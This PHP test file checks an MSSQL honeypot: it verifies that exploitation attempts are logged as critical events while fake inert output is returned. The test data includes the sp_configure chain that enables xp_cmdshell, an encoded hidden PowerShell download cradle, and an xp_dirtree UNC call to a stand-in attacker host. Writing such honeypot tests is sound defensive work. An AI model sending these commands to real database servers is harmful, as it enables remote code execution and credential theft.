<?php

declare(strict_types=1);

namespace Funnypot\Tests\Protocol\Mssql;

use Funnypot\Protocol\Mssql\MssqlConfig;
use Funnypot\Protocol\Mssql\MssqlServer;
use Funnypot\Protocol\Mssql\MssqlSession;
use PHPUnit\Framework\TestCase;

/**
 * The headline trap: the sp_configure -> xp_cmdshell exploitation chain is captured as high-value
 * intel while the honeypot returns plausible inert output and never executes anything.
 */
final class MssqlXpCmdshellTest extends TestCase
{
    use MssqlTestFrames;

    /** @var array<int,array<string,mixed>> */
    private array $events = [];

    /**
     * @return array{0:MssqlServer,1:MssqlSession}
     */
    private function authed(): array
    {
        $this->events = [];
        $server = new MssqlServer(new MssqlConfig(serverName: 'SQL01'), function (array $e): void {
            $this->events[] = $e;
        });
        $session = new MssqlSession('203.0.113.44', 1433, 1);
        $session->inbuf .= self::preloginRequest();
        $server->processInbound($session);
        $session->inbuf .= self::login7Request('PC', 'sa', 'sa', 'sqlcmd', 'ODBC', 'master');
        $server->processInbound($session);
        $session->outbuf = '';

        return [$server, $session];
    }

    private function eventOfType(string $type): ?array
    {
        foreach ($this->events as $e) {
            if (($e['event'] ?? '') === $type) {
                return $e;
            }
        }

        return null;
    }

    public function test_xp_cmdshell_whoami_captured_and_fake_system_output(): void
    {
        [$server, $session] = $this->authed();

        $session->inbuf .= self::sqlBatch("EXEC xp_cmdshell 'whoami'");
        $server->processInbound($session);

        $rce = $this->eventOfType('mssql_rce_attempt');
        self::assertNotNull($rce, 'the trap fires a critical mssql_rce_attempt event');
        self::assertSame('critical', $rce['severity']);
        self::assertTrue($rce['reportable']);
        self::assertSame('xp_cmdshell', $rce['proc']);
        self::assertStringContainsString('whoami', $rce['command']);

        // The client is fed a fabricated 'output' column with the fake SYSTEM identity.
        $body = self::tdsBody($session->outbuf);
        self::assertSame(0x81, ord($body[0]));
        self::assertStringContainsString(self::u16le('output'), $body);
        self::assertStringContainsString(self::u16le('nt authority\\system'), $body);
    }

    public function test_powershell_download_cradle_captured_verbatim(): void
    {
        [$server, $session] = $this->authed();

        $payload = 'powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==';
        $session->inbuf .= self::sqlBatch("EXEC xp_cmdshell '{$payload}'");
        $server->processInbound($session);

        $rce = $this->eventOfType('mssql_rce_attempt');
        self::assertNotNull($rce);
        self::assertStringContainsString($payload, $rce['command'], 'the full C2 command is captured');
        self::assertStringContainsString($payload, $rce['body']);

        // A download cradle emits no stdout: a single NULL row (0xFFFF) after COLMETADATA.
        $body = self::tdsBody($session->outbuf);
        self::assertStringContainsString("\xD1\xFF\xFF", $body, 'a single NULL output row');
    }

    public function test_config_chain_enables_flag_and_returns_info(): void
    {
        [$server, $session] = $this->authed();

        $session->inbuf .= self::sqlBatch("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE");
        $server->processInbound($session);

        self::assertTrue($session->xpCmdshellEnabled, 'the session records the enablement (intel/story only)');
        $rce = $this->eventOfType('mssql_rce_attempt');
        self::assertNotNull($rce);

        $body = self::tdsBody($session->outbuf);
        self::assertStringContainsString(chr(0xAB), $body, 'an INFO token is returned');
        self::assertStringContainsString(self::u16le('changed from 0 to 1'), $body);
    }

    public function test_xp_dirtree_unc_target_is_captured_and_never_dialed(): void
    {
        [$server, $session] = $this->authed();

        $session->inbuf .= self::sqlBatch("EXEC master..xp_dirtree '\\\\attacker.evil\\share', 1, 1");
        $server->processInbound($session);

        $rce = $this->eventOfType('mssql_rce_attempt');
        self::assertNotNull($rce);
        self::assertSame('xp_dirtree', $rce['proc']);
        self::assertStringContainsString('attacker.evil', $rce['command']);
    }

    public function test_multi_statement_batch_traps_later_xp_cmdshell(): void
    {
        [$server, $session] = $this->authed();

        $batch = "EXEC sp_configure 'show advanced options',1; RECONFIGURE; "
            . "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'";
        $session->inbuf .= self::sqlBatch($batch);
        $server->processInbound($session);

        self::assertNotNull($this->eventOfType('mssql_rce_attempt'));
        $body = self::tdsBody($session->outbuf);
        self::assertStringContainsString(self::u16le('nt authority\\system'), $body);
    }
}
